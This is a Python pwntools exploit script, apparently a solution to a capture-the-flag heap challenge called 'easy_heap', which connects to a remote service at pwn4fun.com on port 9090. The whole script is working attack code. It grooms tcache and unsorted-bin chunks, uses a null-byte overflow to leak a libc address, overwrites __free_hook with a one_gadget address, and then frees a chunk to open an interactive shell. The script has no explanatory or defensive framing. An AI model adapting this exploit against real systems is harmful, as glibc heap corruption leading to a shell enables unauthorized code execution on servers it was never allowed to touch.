#! /usr/bin/python

from pwn import *
from LibcSearcher import *

p = remote('pwn4fun.com',9090)
elf = ELF('./easy_heap')
libc = ELF('./libc64.so')
context.log_level = 'debug'


def menu(idx):
    p.recvuntil('>')
    p.sendline(str(idx))


def new(size, content):
    menu(1)
    p.recvuntil('>')
    p.sendline(str(size))
    p.recvuntil('> ')
    if len(content) >= size:
        p.send(content)
    else:
        p.sendline(content)


def delete(idx):
    menu(2)
    p.recvuntil('index \n> ')
    p.sendline(str(idx))


def show(idx):
    menu(3)
    p.recvuntil('> ')
    p.sendline(str(idx))

###leak libc###
for i in range(7):
	new(0x10,'Tcache')
for i in range(3):
	new(0x10,'unsorted bin')

for i in range(6):
	delete(i)
delete(9)
for i in range(6,9):
	delete(i)


for i in range(7):
	new(0x10,'Tcache')
new(0x10, '7 - first')
new(0x10, '8 - second')
new(0x10, '9 - third')

for i in range(6):
	delete(i)
delete(8)#B in to tcache
delete(7)#A free

new(0xf8,'null-by-one')#0 B
delete(6)#file tcache
delete(9)

for i in range(7):
	new(0x10,'tcache')
new(0x10,'A')

show(0)
libc.address = u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')) - 0x3ebca0

###hijack hook###
free_hook = libc.symbols['__free_hook']
one_gadget = libc.address + 0x4f322

new(0x10,'aaaa')#now all of chunks have been malloc


delete(2)
delete(3)

delete(0)
delete(9)

new(0x10,p64(free_hook))#0

new(0x10,'aaaa')#1
new(0x10,p64(one_gadget))

###get shell###
delete(0)
p.interactive()